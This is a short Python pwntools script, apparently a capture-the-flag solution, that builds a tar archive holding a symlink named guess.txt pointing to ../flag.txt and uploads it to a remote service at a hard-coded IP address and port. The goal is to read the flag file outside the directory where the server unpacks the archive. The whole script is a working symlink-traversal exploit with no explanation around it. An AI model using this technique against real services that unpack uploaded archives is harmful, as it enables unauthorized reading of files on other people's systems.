import subprocess
from pwn import *

subprocess.check_call('ln -sf ../flag.txt guess.txt'.split(' '))
tar = subprocess.check_output('tar -cf - guess.txt'.split(' '))
sz = len(tar)
print(f'{sz=}')

q = remote('60.250.197.227', 11000)
q.sendline(str(sz))
q.send(tar)
q.interactive()
